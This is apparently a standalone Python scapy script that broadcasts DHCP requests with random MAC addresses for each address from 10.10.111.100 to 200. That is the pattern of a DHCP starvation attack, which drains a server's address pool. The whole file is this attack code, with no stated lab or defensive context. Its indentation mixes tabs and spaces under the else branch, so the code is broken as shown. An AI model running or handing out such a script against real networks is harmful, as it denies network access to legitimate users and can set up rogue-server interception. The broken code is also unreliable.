import sys
from scapy.all import *
import time

def main():
	for i in range(100,201):
		ip = "10.10.111.%d"%i #Formulated IP Address
		conf.checkIPaddr = False
		#DHCP Request
		dhcp_request = Ether(src="02:00:8b:46:09:01",dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandMAC())/DHCP(options =[("message-type","request"),("requested_addr",ip),"end"])
		ack = srp1(dhcp_request)    #Send packet and store ack
		if(ack == None):    #If no acknowledgement, send packet again
			ack = srp1(dhcp_request)
		if(ack):
			print( "ACK Received for %s"%ip)
		else :
            time.sleep(3)   #Wait and try again
			ack = srp1(dhcp_request)
		time.sleep(3)   #Wait between DHCP requests

if __name__ == '__main__':
	main()
